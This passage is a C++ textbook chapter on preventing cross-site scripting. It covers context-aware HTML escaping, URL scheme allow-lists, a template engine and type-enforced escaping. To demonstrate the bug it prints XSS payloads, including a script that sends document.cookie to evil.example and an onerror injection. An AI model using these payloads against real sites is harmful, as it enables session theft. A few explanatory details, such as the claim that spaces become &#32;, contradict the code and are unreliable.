---
chapter: 39
part: 5
title: HTML Templates and Escaping
summary: Render HTML from data without letting that data become markup, by escaping for the right context and making the unsafe version fail to compile.
minutes: 65
tags: [html, escaping, xss, templates, security, utf-8]
---

Chapter 38 taught the service to remember things in a database. Now it has to show them. That
means writing HTML, and HTML is the one output format where a value and an instruction share
the same alphabet: `<` is both a character you might want to display and the start of a tag.
Everything in this chapter follows from that single collision.

Cross-site scripting — XSS — is what happens when data you stored arrives at a browser as
markup instead. It is not an exotic attack. It is the default outcome of string concatenation,
and it has been in the OWASP top three for twenty years because the vulnerable shape is the
obvious one. This chapter is how to make the vulnerable shape impossible: escape for the
context, and give the dangerous value a type that will not convert.

## The bug, in full

Here is a comment rendered by pasting strings together. Every value below came from a user.

```cpp run
#include <cstdio>
#include <string>

// Building HTML by concatenating strings. Every value below came from a user.
std::string comment_unsafe(const std::string &author, const std::string &body) {
    return "<div class=\"comment\">\n"
           "  <p class=\"author\">" + author + "</p>\n"
           "  <p class=\"body\">" + body + "</p>\n"
           "</div>\n";
}

std::string avatar_unsafe(const std::string &url) {
    return "<img src=\"" + url + "\" alt=\"avatar\" width=\"32\" height=\"32\">\n";
}

int main() {
    std::printf("%s", comment_unsafe("Ada", "nice post!").c_str());

    std::printf("%s", comment_unsafe(
                          "Ada",
                          "<script>fetch('//evil.example?c=' + document.cookie)</script>")
                          .c_str());

    // The same mistake one context over: inside a quoted attribute, the value
    // only has to contain a quote to leave the attribute entirely.
    std::printf("%s", avatar_unsafe("https://cdn.example/a.png").c_str());
    std::printf("%s", avatar_unsafe("x\" onerror=\"alert(document.cookie)").c_str());
    return 0;
}
```

```text
<div class="comment">
  <p class="author">Ada</p>
  <p class="body">nice post!</p>
</div>
<div class="comment">
  <p class="author">Ada</p>
  <p class="body"><script>fetch('//evil.example?c=' + document.cookie)</script></p>
</div>
<img src="https://cdn.example/a.png" alt="avatar" width="32" height="32">
<img src="x" onerror="alert(document.cookie)" alt="avatar" width="32" height="32">
```

Look at the fourth line. The user typed a URL into their "avatar" field, and the URL contained
a double quote. The quote closed the `src` attribute early, and the rest of their text —
`onerror="alert(document.cookie)"` — was parsed as a **new attribute**. No script tag, no angle
brackets, nothing that looks dangerous if you are grepping for `<script>`. Just a quote.

The second block is the same mistake in text context: `<script>` lands in the page and the
browser runs it. Both of them are one function call away from being correct.

:::danger "We escape it later, on the way out"
The most common defence offered in code review is "it is escaped in the view layer". That is
only a defence if *every* path into the view layer goes through the escaper, and the moment
someone adds an admin page, a CSV export or a JSON endpoint, it does not. Escaping at the point
of substitution is a property of the renderer; escaping "somewhere later" is a hope.
:::

## Escaping, done in one pass

Five characters matter in HTML text and in a quoted attribute.

```cpp run
#include <cstdio>
#include <string>
#include <string_view>

// One pass over the input. Each input byte maps to one output fragment, so the
// `&` inserted here is never re-examined -- which is the property the chained
// version below gets wrong.
std::string escape_html(std::string_view input) {
    std::string out;
    out.reserve(input.size());
    for (const char c : input) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return out;
}

int main() {
    const std::string script = "<script>alert('x')</script>";
    const std::string attribute = "x\" onerror=\"alert(1)";
    const std::string ampersand = "Tom & Jerry <3";

    std::printf("script    : %s\n", escape_html(script).c_str());
    std::printf("attribute : %s\n", escape_html(attribute).c_str());
    std::printf("ampersand : %s\n", escape_html(ampersand).c_str());
    std::printf("plain     : %s\n", escape_html("nothing to do here").c_str());
    std::printf("grown from %zu to %zu bytes\n", script.size(), escape_html(script).size());
    return 0;
}
```

```text
script    : &lt;script&gt;alert(&#39;x&#39;)&lt;/script&gt;
attribute : x&quot; onerror=&quot;alert(1)
ampersand : Tom &amp; Jerry &lt;3
plain     : nothing to do here
grown from 27 to 47 bytes
```

The loop is the whole implementation, and the property that makes it correct is that **it is
one pass**: each input byte is examined once and mapped to one output fragment, so the `&` in
`&amp;` is never reconsidered. Keep that in mind for the next section. `&` must be first in
*spirit* even though a switch does not have an order — and it matters enormously if you
implement this the other way.

Note `'` is escaped as `&#39;` rather than `&apos;`. `&apos;` is valid in XHTML and in HTML5
parsers, but `&#39;` works everywhere including inside attributes delimited by single quotes,
which is what you get when a template writes `onclick='...'`.

## The ordering bug, measured

Here is the same escaper written the way people naturally write it — a chain of replacements.

```cpp run
#include <cstdio>
#include <string>

static std::string replace_all(std::string subject, const std::string &from,
                               const std::string &to) {
    std::size_t at = 0;
    while ((at = subject.find(from, at)) != std::string::npos) {
        subject.replace(at, from.size(), to);
        at += to.size();
    }
    return subject;
}

// Escaping with a chain of string replacements. The order decides whether the
// ampersands the replacements themselves introduce get escaped a second time.
std::string escape_order_bad(std::string value) {
    value = replace_all(value, "<", "&lt;");
    value = replace_all(value, ">", "&gt;");
    value = replace_all(value, "\"", "&quot;");
    value = replace_all(value, "'", "&#39;");
    value = replace_all(value, "&", "&amp;");  // too late
    return value;
}

std::string escape_order_good(std::string value) {
    value = replace_all(value, "&", "&amp;");  // first, for once
    value = replace_all(value, "<", "&lt;");
    value = replace_all(value, ">", "&gt;");
    value = replace_all(value, "\"", "&quot;");
    value = replace_all(value, "'", "&#39;");
    return value;
}

int main() {
    const std::string input = "a < b & c > d";
    std::printf("input          : %s\n", input.c_str());
    std::printf("& last         : %s\n", escape_order_bad(input).c_str());
    std::printf("& first        : %s\n", escape_order_good(input).c_str());
    std::printf("browser shows, & last  : a &lt; b & c &gt; d\n");
    std::printf("browser shows, & first : a < b & c > d\n");
    return 0;
}
```

```text
input          : a < b & c > d
& last         : a &amp;lt; b &amp; c &amp;gt; d
& first        : a &lt; b &amp; c &gt; d
browser shows, & last  : a &lt; b & c &gt; d
browser shows, & first : a < b & c > d
```

Escaping `<` and `>` first produces `&lt;`, and *then* escaping `&` turns that into `&amp;lt;`.
The browser decodes `&amp;lt;` to the four characters `&lt;`, so the user sees literal `&lt; b`
where they typed `< b`. The data has been through the escaper twice and is now wrong in a way
that looks like a rendering bug, which is why this survives code review.

If you must chain, `&` goes first. If you can write a loop, write the loop.

## Context: the same string is safe in one place and not in another

Escaping HTML syntax is necessary and, on its own, not sufficient. There are three contexts a
value can land in, and they need three different treatments.

```cpp run
#include <cstdio>
#include <string>
#include <string_view>

std::string escape_html(std::string_view input) {
    std::string out;
    out.reserve(input.size());
    for (const char c : input) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return out;
}

// Escaping HTML syntax does nothing about a URL's *scheme*. A link is executed,
// not displayed, so the only safe answer is an allow-list of schemes.
std::string safe_url(std::string_view input, std::string_view base) {
    const auto has = [&](std::string_view prefix) {
        return input.size() >= prefix.size() && input.compare(0, prefix.size(), prefix) == 0;
    };
    if (has("http://") || has("https://") || has("mailto:")) return std::string(input);
    if (!input.empty() && input.front() == '/' && input.size() > 1 && input[1] != '/') {
        return std::string(input);  // a site-relative path
    }
    if (input.empty()) return std::string(base);
    return std::string(base);  // anything else is not a URL we will emit
}

int main() {
    const std::string attack = "javascript:alert(document.cookie)";

    std::printf("--- text context ---\n");
    std::printf("  %s\n", escape_html("<script>alert(1)</script>").c_str());

    std::printf("--- URL context ---\n");
    std::printf("  escaped : %s\n", escape_html(attack).c_str());
    std::printf("  allowed : %s\n", safe_url(attack, "/").c_str());
    std::printf("  https   : %s\n", safe_url("https://example.com/a", "/").c_str());
    std::printf("  relative: %s\n", safe_url("/profile/ada", "/").c_str());
    std::printf("  protocol-relative: %s\n", safe_url("//evil.example", "/").c_str());
    std::printf("  empty   : %s\n", safe_url("", "/").c_str());

    std::printf("--- JavaScript context ---\n");
    // Neither of the two fixes above applies here. Data going into a script
    // block needs JSON encoding, not HTML escaping.
    const std::string payload = "</script><script>alert(1)</script>";
    std::printf("  html-escaped still breaks out: %s\n", escape_html(payload).c_str());
    return 0;
}
```

```text
--- text context ---
  &lt;script&gt;alert(1)&lt;/script&gt;
--- URL context ---
  escaped : javascript:alert(document.cookie)
  allowed : /
  https   : https://example.com/a
  relative: /profile/ada
  protocol-relative: /
  empty   : /
--- JavaScript context ---
  html-escaped still breaks out: &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
```

- **Text context** (`<p>{{value}}</p>`): escaping five characters is a complete answer.
- **Attribute context** (`<img src="{{value}}">`): escaping five characters is still a complete
  answer, *provided* the attribute is quoted. An unquoted attribute is broken by a single space.
- **URL context** (`<a href="{{value}}">`): **escaping does nothing.** Look at the output —
  `javascript:alert(document.cookie)` contains no HTML metacharacter, so it survives escaping
  untouched, and the browser executes it when the link is clicked. The danger here is the
  *scheme*, not the syntax.
- **JavaScript context** (`<script>var x = "{{value}}";</script>`): escaping is not the answer
  either. The value needs JSON string encoding, and even then `</script>` inside the string
  terminates the script element early because the HTML parser gets there first. The fix for
  this one is to not build JavaScript by interpolation.

`safe_url` above is the shape of the URL fix: an **allow-list of schemes**, everything else
replaced by a fallback. A deny-list — "reject if it contains `javascript:`" — loses, because
`JaVaScRiPt:`, `java\tscript:` and `&#106;avascript:` all reach the same place. Note that
`//evil.example` is rejected too: it is a protocol-relative URL, meaning "this path, on
another host".

## A template engine, with the escaper built in

A template is a string with named holes. The engine fills them, and the engine — not the
caller — decides whether to escape.

```cpp run
#include <cstdio>
#include <map>
#include <stdexcept>
#include <string>
#include <string_view>

std::string escape_html(std::string_view input) {
    std::string out;
    out.reserve(input.size());
    for (const char c : input) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return out;
}

// `{{name}}` is escaped, `{{{name}}}` is inserted verbatim. The extra brace is
// deliberate friction: raw insertion should look different at a glance.
std::string render(const std::string &tpl, const std::map<std::string, std::string> &vars) {
    std::string out;
    out.reserve(tpl.size());
    std::size_t i = 0;
    while (i < tpl.size()) {
        const std::size_t open = tpl.find("{{", i);
        if (open == std::string::npos) {
            out += tpl.substr(i);
            break;
        }
        out += tpl.substr(i, open - i);

        const bool raw = tpl.compare(open, 3, "{{{") == 0;
        const std::size_t name_at = open + (raw ? 3 : 2);
        const std::size_t close = tpl.find(raw ? "}}}" : "}}", name_at);
        if (close == std::string::npos) {
            throw std::runtime_error("unterminated placeholder at offset " + std::to_string(open));
        }
        const std::string name = tpl.substr(name_at, close - name_at);
        const auto found = vars.find(name);
        if (found == vars.end()) {
            throw std::runtime_error("no value supplied for {{" + name + "}}");
        }
        out += raw ? found->second : escape_html(found->second);
        i = close + (raw ? 3 : 2);
    }
    return out;
}

int main() {
    const std::string tpl =
        "<h1>Hello {{name}}</h1>\n"
        "<p>{{body}}</p>\n"
        "<p class=\"raw\">{{{body}}}</p>\n";

    const std::map<std::string, std::string> vars = {
        {"name", "Ada"},
        {"body", "<script>alert(1)</script>"},
    };

    std::printf("%s", render(tpl, vars).c_str());

    std::printf("--- a missing value is an error, not an empty string ---\n");
    try {
        render("<p>{{oops}}</p>", vars);
    } catch (const std::runtime_error &e) {
        std::printf("  caught: %s\n", e.what());
    }

    std::printf("--- an unterminated placeholder is an error too ---\n");
    try {
        render("<p>{{oops</p>", vars);
    } catch (const std::runtime_error &e) {
        std::printf("  caught: %s\n", e.what());
    }
    return 0;
}
```

```text
<h1>Hello Ada</h1>
<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
<p class="raw"><script>alert(1)</script></p>
--- a missing value is an error, not an empty string ---
  caught: no value supplied for {{oops}}
--- an unterminated placeholder is an error too ---
  caught: unterminated placeholder at offset 3
```

Two deliberate choices. First, `{{name}}` escapes and `{{{name}}}` does not: raw insertion is
available, but it has to be typed differently, so it is visible in review and greppable. Second,
a placeholder with no value is an **exception**, not an empty string. A typo in a template
should break the build's tests, not silently publish a page with a hole in it.

## Make the unsafe version fail to compile

Escaping by convention is escaping you will eventually forget. The move that actually holds is
a type: give unescaped values a type that cannot reach the renderer.

```cpp run
#include <cstdio>
#include <map>
#include <string>
#include <string_view>
#include <utility>

// A value that has not been escaped yet. The only way out of this type is
// `escape`, so an unescaped string cannot reach the renderer by accident.
class Untrusted {
public:
    explicit Untrusted(std::string text) : text_(std::move(text)) {}
    std::string_view text() const { return text_; }

private:
    std::string text_;
};

// A value that is safe to place in HTML text or a quoted attribute.
class Html {
public:
    explicit Html(std::string text) : text_(std::move(text)) {}
    std::string_view text() const { return text_; }

private:
    std::string text_;
};

Html escape(const Untrusted &value) {
    std::string out;
    for (const char c : value.text()) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return Html(std::move(out));
}

// Markup the programmer wrote, not the user. Still explicit, still visible.
Html trusted(std::string markup) { return Html(std::move(markup)); }

std::string render(const std::string &tpl, const std::map<std::string, Html> &vars) {
    std::string out = tpl;
    for (const auto &[name, value] : vars) {
        const std::string needle = "{{" + name + "}}";
        std::size_t at = 0;
        while ((at = out.find(needle, at)) != std::string::npos) {
            out.replace(at, needle.size(), value.text());
            at += value.text().size();
        }
    }
    return out;
}

int main() {
    const std::string from_user = "<script>alert(1)</script>";
    const std::string tpl = "<p>{{greeting}}</p>\n<p>{{note}}</p>\n";

    // The type system refuses to let the raw value through; `escape` is the
    // only door, and `trusted` is the one you have to type out loud.
    std::printf("%s", render(tpl, {{"greeting", escape(Untrusted(from_user))},
                                   {"note", trusted("<em>written by us</em>")}})
                          .c_str());
    return 0;
}
```

```text
<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
<p><em>written by us</em></p>
```

`escape` is the only way to turn an `Untrusted` into an `Html`, and `trusted` is the escape
hatch for markup you wrote yourself — spelled out at the call site, where a reviewer can see
it. Both constructors are `explicit`, so there is no implicit path between them.

```cpp bad
#include <cstdio>
#include <map>
#include <string>
#include <string_view>
#include <utility>

class Untrusted {
public:
    explicit Untrusted(std::string text) : text_(std::move(text)) {}
    std::string_view text() const { return text_; }

private:
    std::string text_;
};

class Html {
public:
    explicit Html(std::string text) : text_(std::move(text)) {}
    std::string_view text() const { return text_; }

private:
    std::string text_;
};

Html escape(const Untrusted &value);

std::string render(const std::string &tpl, const std::map<std::string, Html> &vars) {
    std::string out = tpl;
    for (const auto &[name, value] : vars) {
        const std::string needle = "{{" + name + "}}";
        std::size_t at = 0;
        while ((at = out.find(needle, at)) != std::string::npos) {
            out.replace(at, needle.size(), value.text());
            at += value.text().size();
        }
    }
    return out;
}

int main() {
    const std::string from_user = "<script>alert(1)</script>";

    // No implicit way to turn an Untrusted into an Html, so this never
    // compiles -- which is the whole point of giving them different types.
    std::printf("%s", render("<p>{{name}}</p>", {{"name", Untrusted(from_user)}}).c_str());
    return 0;
}
```

```text
error: no matching function for call to 'render'
```

That rejection is the payoff. There is no runtime check, no lint rule, no "remember to escape"
comment: the program does not build. Compare this with Chapter 24's argument for `const` — the
point of a type is that the mistake stops being possible rather than merely discouraged.

## Truncating text without breaking it

A template that truncates a value to fit a layout has one more way to corrupt it.

```cpp run
#include <cstddef>
#include <cstdio>
#include <string>

static bool is_continuation(unsigned char byte) { return (byte & 0xC0) == 0x80; }

static bool valid_utf8(const std::string &s) {
    std::size_t i = 0;
    while (i < s.size()) {
        const unsigned char lead = static_cast<unsigned char>(s[i]);
        std::size_t extra = 0;
        if (lead < 0x80) extra = 0;
        else if ((lead & 0xE0) == 0xC0) extra = 1;
        else if ((lead & 0xF0) == 0xE0) extra = 2;
        else if ((lead & 0xF8) == 0xF0) extra = 3;
        else return false;
        if (i + extra >= s.size()) return false;
        for (std::size_t k = 1; k <= extra; ++k) {
            if (!is_continuation(static_cast<unsigned char>(s[i + k]))) return false;
        }
        i += extra + 1;
    }
    return true;
}

// Cutting UTF-8 at an arbitrary byte offset can land inside a character. The
// result is not a shorter string, it is an invalid one.
std::string truncate_utf8(const std::string &s, std::size_t limit) {
    if (s.size() <= limit) return s;
    std::size_t end = limit;
    if (is_continuation(static_cast<unsigned char>(s[end]))) {
        // Walk back to the lead byte, then cut before it: a lead byte on its
        // own is just as invalid as a dangling continuation.
        while (end > 0 && is_continuation(static_cast<unsigned char>(s[end]))) --end;
    }
    return s.substr(0, end);
}

static void show(const char *label, const std::string &s) {
    std::printf("%-14s", label);
    for (const char c : s) std::printf(" %02x", static_cast<unsigned char>(c));
    // Only print the text when it is valid: an invalid sequence is the point of
    // the example, and printing it would make this captured transcript
    // unreadable rather than instructive.
    std::printf("   valid=%-3s  text=%s\n", valid_utf8(s) ? "yes" : "NO",
                valid_utf8(s) ? s.c_str() : "(not printable)");
}

int main() {
    // Built from code points so the byte sequence is explicit:
    // c a f é(2 bytes) space 你(3) 好(3) 世(3) 界(3)  ->  17 bytes
    const std::string text = "café 你好世界";
    std::printf("full (%zu bytes)\n", text.size());
    show("full", text);
    std::printf("\n");

    for (const std::size_t limit : {std::size_t{7}, std::size_t{8}}) {
        std::printf("limit %zu\n", limit);
        show("  naive", text.substr(0, limit));
        show("  safe", truncate_utf8(text, limit));
        std::printf("\n");
    }
    return 0;
}
```

```text
full (18 bytes)
full           63 61 66 c3 a9 20 e4 bd a0 e5 a5 bd e4 b8 96 e7 95 8c   valid=yes  text=café 你好世界

limit 7
  naive        63 61 66 c3 a9 20 e4   valid=NO   text=(not printable)
  safe         63 61 66 c3 a9 20   valid=yes  text=café 

limit 8
  naive        63 61 66 c3 a9 20 e4 bd   valid=NO   text=(not printable)
  safe         63 61 66 c3 a9 20   valid=yes  text=café 
```

At limit 7 the naive cut ends on the lead byte of `你`; at limit 8 it ends on a continuation
byte. Both are invalid UTF-8, and what the browser does with an invalid sequence is up to the
browser — typically a replacement character, sometimes a hole in the page. The safe version
walks back to the start of the character and cuts there.

This is the same lesson as Chapter 36's UTF-8 work from the other direction: a `std::string` is
a byte string, and "ten characters" is not `substr(0, 10)`.

## The module

Header, implementation, a program that renders a page and tests the renderer, and the
`Makefile`. Banners mark the file boundaries; they are separators for the listing, not part of
the files.

```cpp make-files
/* ===== page.h ===== */

#ifndef PAGE_H
#define PAGE_H

#include <map>
#include <stdexcept>
#include <string>
#include <string_view>

// Two types, because the difference between them is the entire security
// property: an Untrusted value has not been through `escape`, an Html one has.
class Untrusted {
public:
    explicit Untrusted(std::string text) : text_(std::move(text)) {}
    std::string_view text() const { return text_; }

private:
    std::string text_;
};

class Html {
public:
    explicit Html(std::string text) : text_(std::move(text)) {}
    std::string_view text() const { return text_; }

private:
    std::string text_;
};

// The only two doors from Untrusted into Html.
Html escape(Untrusted value);                 // for HTML text and attributes
Html trusted(std::string markup);             // for markup we wrote ourselves
Html safe_url(Untrusted value, std::string_view fallback);  // for href/src

// Throws std::runtime_error on an unknown or unterminated placeholder: a typo
// in a template should be a failed render, not an empty paragraph.
std::string render(std::string_view tpl, const std::map<std::string, Html> &vars);

class TemplateError : public std::runtime_error {
public:
    explicit TemplateError(const std::string &message) : std::runtime_error(message) {}
};

#endif

/* ===== page.cpp ===== */

#include "page.h"

#include <utility>

namespace {

std::string escaped(std::string_view input) {
    std::string out;
    out.reserve(input.size());
    for (const char c : input) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return out;
}

bool starts_with(std::string_view text, std::string_view prefix) {
    return text.size() >= prefix.size() && text.compare(0, prefix.size(), prefix) == 0;
}

}  // namespace

Html escape(const Untrusted value) { return Html(escaped(value.text())); }

Html trusted(std::string markup) { return Html(std::move(markup)); }

Html safe_url(const Untrusted value, const std::string_view fallback) {
    const std::string_view url = value.text();
    if (starts_with(url, "http://") || starts_with(url, "https://") ||
        starts_with(url, "mailto:")) {
        return Html(escaped(url));
    }
    // A site-relative path is fine; `//host` is not, it means another host.
    if (url.size() > 1 && url.front() == '/' && url[1] != '/') {
        return Html(escaped(url));
    }
    return Html(escaped(fallback));
}

std::string render(const std::string_view tpl, const std::map<std::string, Html> &vars) {
    std::string out;
    out.reserve(tpl.size());
    std::size_t i = 0;
    while (i < tpl.size()) {
        const std::size_t open = tpl.find("{{", i);
        if (open == std::string_view::npos) {
            out += tpl.substr(i);
            break;
        }
        out += tpl.substr(i, open - i);

        const bool raw = tpl.compare(open, 3, "{{{") == 0;
        const std::size_t name_at = open + (raw ? 3 : 2);
        const std::size_t close = tpl.find(raw ? "}}}" : "}}", name_at);
        if (close == std::string_view::npos) {
            throw TemplateError("unterminated placeholder at offset " + std::to_string(open));
        }
        const std::string name(tpl.substr(name_at, close - name_at));
        const auto found = vars.find(name);
        if (found == vars.end()) {
            throw TemplateError("no value supplied for {{" + name + "}}");
        }
        out += found->second.text();
        i = close + (raw ? 3 : 2);
    }
    return out;
}

/* ===== main.cpp ===== */

#include "page.h"

#include <cstdio>
#include <string>

namespace {

int failures = 0;

void check(const char *what, std::string_view got, std::string_view want) {
    const bool ok = got == want;
    if (!ok) ++failures;
    std::printf("  [%s] %-28s %.*s\n", ok ? "ok" : "FAIL", what,
                static_cast<int>(got.size()), got.data());
}

}  // namespace

int main() {
    std::printf("--- the page ---\n");
    const std::string layout =
        "<article>\n"
        "  <h1>{{title}}</h1>\n"
        "  <p>{{body}}</p>\n"
        "  <a href=\"{{{link}}}\">profile</a>\n"
        "  <footer>{{{footer}}}</footer>\n"
        "</article>\n";

    // Everything here came from a request. That is the assumption the types
    // enforce, not a comment someone has to remember.
    std::printf("%s", render(layout,
                             {{"title", escape(Untrusted("<script>alert(1)</script>"))},
                              {"body", escape(Untrusted("Tom & Jerry <3 \"quotes\""))},
                              {"link", safe_url(Untrusted("javascript:alert(1)"), "/")},
                              {"footer", trusted("<em>rendered by us</em>")}})
                          .c_str());

    std::printf("--- self-test ---\n");
    check("escapes a script tag", escape(Untrusted("<script>")).text(),
          std::string("&lt;script&gt;"));
    check("escapes an ampersand once", escape(Untrusted("a &amp; b")).text(),
          std::string("a &amp;amp; b"));
    check("escapes a quote", escape(Untrusted("\"")).text(), std::string("&quot;"));
    check("javascript: is replaced",
          safe_url(Untrusted("javascript:alert(1)"), "/").text(), std::string("/"));
    check("//host is replaced", safe_url(Untrusted("//evil.example"), "/").text(),
          std::string("/"));
    check("https survives", safe_url(Untrusted("https://example.com/a?b=1&c=2"), "/").text(),
          std::string("https://example.com/a?b=1&amp;c=2"));

    try {
        render("<p>{{typo}}</p>", {});
        std::printf("  [FAIL] unknown placeholder should throw\n");
        ++failures;
    } catch (const TemplateError &error) {
        std::printf("  [ok]   unknown placeholder throws: %s\n", error.what());
    }

    std::printf("failures: %d\n", failures);
    return failures == 0 ? 0 : 1;
}

/* ===== Makefile ===== */

CXXFLAGS = -std=c++17 -Wall -Wextra -Werror

prog: main.cpp page.cpp page.h
	$(CXX) $(CXXFLAGS) -o prog main.cpp page.cpp

clean:
	rm -f prog
```

```text
--- the page ---
<article>
  <h1>&lt;script&gt;alert(1)&lt;/script&gt;</h1>
  <p>Tom &amp; Jerry &lt;3 &quot;quotes&quot;</p>
  <a href="/">profile</a>
  <footer><em>rendered by us</em></footer>
</article>
--- self-test ---
  [ok] escapes a script tag         &lt;script&gt;
  [ok] escapes an ampersand once    a &amp;amp; b
  [ok] escapes a quote              &quot;
  [ok] javascript: is replaced      /
  [ok] //host is replaced           /
  [ok] https survives               https://example.com/a?b=1&amp;c=2
  [ok]   unknown placeholder throws: no value supplied for {{typo}}
failures: 0
```

The self-test at the bottom is the part worth copying. Six assertions and one expected throw,
printed, and a non-zero exit if any of them fails — so `make && ./prog` in CI tells you the
escaper still works. An escaper with no test is a claim; this one is a measurement.

```sh run-project
make clean
make
./prog
```

```text
rm -f prog
c++ -std=c++17 -Wall -Wextra -Werror -o prog main.cpp page.cpp
--- the page ---
<article>
  <h1>&lt;script&gt;alert(1)&lt;/script&gt;</h1>
  <p>Tom &amp; Jerry &lt;3 &quot;quotes&quot;</p>
  <a href="/">profile</a>
  <footer><em>rendered by us</em></footer>
</article>
--- self-test ---
  [ok] escapes a script tag         &lt;script&gt;
  [ok] escapes an ampersand once    a &amp;amp; b
  [ok] escapes a quote              &quot;
  [ok] javascript: is replaced      /
  [ok] //host is replaced           /
  [ok] https survives               https://example.com/a?b=1&amp;c=2
  [ok]   unknown placeholder throws: no value supplied for {{typo}}
failures: 0
```

:::scenario The "safe" markdown feature
A product manager asks for markdown in user comments. Your renderer already escapes
everything, so the team proposes: escape the input, then run a markdown-to-HTML converter over
the result and insert the HTML raw with `trusted`. Someone points out that escaping first means
the markdown syntax (`#`, `*`) has already been turned into entities and nothing will render,
so the order gets swapped: convert markdown to HTML, then escape. Now the headings render and
the script tags show as text, and it ships. Two weeks later a comment with a raw HTML block
executes. What went wrong, and what is the design that does not have this hole?
:::

:::solution Markdown
**What went wrong:** both orders are broken, because markdown and HTML are not separable by
escaping. Convert-then-escape disables markdown (the generated tags become visible text);
escape-then-convert is safe but useless; and the version that shipped — convert, then insert
raw — is safe only for the subset of markdown that cannot produce raw HTML, which is no subset
at all, because every markdown dialect lets you write `<div>` or `&#60;script&#62;` and get it
through verbatim.

**The design that works:**

1. **Convert markdown to HTML with a converter that has a sanitising mode**, running *after*
   conversion and *before* insertion. The order is fixed: markdown in, HTML out, **sanitise**,
   insert. Sanitising means parsing the generated HTML into a tree and rewriting it against an
   allow-list of tags and attributes — `p, em, strong, a[href], code, pre, ul, ol, li,
   blockquote, h1–h6` and nothing else. Anything not on the list is dropped, not escaped.
2. **Run `safe_url` on every surviving `href` and `src`**, using the same allow-list of schemes
   from this chapter. A sanitised tree with `href="javascript:..."` is still an XSS.
3. **Strip event handlers by construction**: if the attribute allow-list is `href`, `title` and
   `alt`, then `onerror` cannot survive, without anyone having to remember to look for it.
4. **Keep the result in the `Html` type** and let the template insert it with `{{{...}}}`. The
   type now means "produced by a sanitiser", which is a different claim from "written by us" —
   so name that constructor `sanitised`, not `trusted`, and reviewers can tell them apart.

The general rule: **escaping is for text; allow-listing is for markup.** Once user input is
allowed to produce markup at all, no amount of escaping will save you, because escaping and
markup are opposites. Sanitise a parsed tree against an allow-list, never against a deny-list.
:::

:::pitfall Five ways this chapter's bug comes back
1. **Escaping `<` and `>` but not `"` or `'`.** Enough for text context, useless the moment the
   value lands inside an attribute — which is where `src`, `href`, `value`, `alt` and `title`
   all live.
2. **Escaping at the wrong time.** Chained replacements that do `&` last double-escape. A
   one-pass loop cannot.
3. **Assuming escaping covers URLs.** `javascript:` has no HTML metacharacters. Allow-list the
   scheme, and reject `//host`.
4. **Truncating by bytes.** `substr(0, n)` can cut a UTF-8 character in half; the result is not
   valid text.
5. **Using `trusted()` on anything a user touched.** The type is there to make that call site
   visible, not to make it correct.
:::

## Key takeaways

- HTML confuses data with instructions because `<`, `>`, `"`, `'` and `&` are both content and
  syntax; escaping is what separates them again.
- Escape in **one pass** over the input. A chain of replacements that escapes `&` last turns
  `&lt;` into `&amp;lt;` and shows the user literal `&lt;`.
- Five characters are enough for **text context** and for a **quoted attribute**: `&`, `<`,
  `>`, `"`, `'`.
- Escaping does **nothing** in URL context — `javascript:` contains no metacharacters. Allow-list
  the scheme (`http`, `https`, `mailto`, site-relative) and reject `//host`.
- Escaping is also the wrong tool in JavaScript context. Do not build scripts by interpolation.
- A raw-insertion placeholder should look different from an escaped one, so it is visible in
  review and greppable.
- An unknown or unterminated placeholder should throw. A template typo must not publish a page
  with a hole in it.
- Give unescaped values their own type with no implicit conversion to the safe type, and the
  unsafe call site stops compiling instead of shipping.
- `substr` cuts bytes, not characters; truncating UTF-8 needs to walk back to a character
  boundary first.
- An escaper with a self-test is evidence; an escaper without one is an assertion.

## Practice

- [ ] **Exercise 1.** Write `escape_attribute` and show that it is the same function as
      `escape_html`. Then find a value that is safe in text context and dangerous in an
      **unquoted** attribute, and explain why quoting the attribute fixes it.
- [ ] **Exercise 2.** Extend `safe_url` so it also rejects `data:` and `vbscript:`, and prove
      with one run that `data:text/html;base64,...` does not survive.
- [ ] **Exercise 3.** Add `{{#if name}}...{{/if}}` to the template engine: render the block only
      if the variable was supplied. Keep the unknown-placeholder exception.
- [ ] **Exercise 4.** Write `std::string truncate_words(const std::string &, std::size_t)` that
      cuts at a word boundary **and** never mid-UTF-8-character, then verify the result is valid
      UTF-8 for an input whose 40th byte is inside a character.
- [ ] **Exercise 5.** Make the `Html` type carry its own provenance: add a `Provenance` enum
      (`escaped`, `sanitised`, `authored`) and print it in the rendered page's HTML comment, so a
      reviewer inspecting the output can see where each value came from.

## Solutions

:::solution Exercise 1
There is no separate function, and that is the answer: the five characters are the complete set
for both contexts. The difference is not the escaper, it is the **quotes**. In
`<img src={{value}}>` — unquoted — the value `x onerror=alert(1)` needs no metacharacter at
all: a space ends the attribute and `onerror=` starts a new one. Escaping turns it into
`x&#32;onerror=alert(1)`, which is still one token with a space inside it, so the attribute
never ends, but you are now relying on the escaper for structural integrity instead of for
syntax. Quote every attribute you interpolate into:

```cpp run
#include <cstdio>
#include <string>
#include <string_view>

// One function, because the five characters are the complete set for both
// contexts. The difference between text and attribute is not the escaper.
std::string escape_html(std::string_view input) {
    std::string out;
    out.reserve(input.size());
    for (const char c : input) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return out;
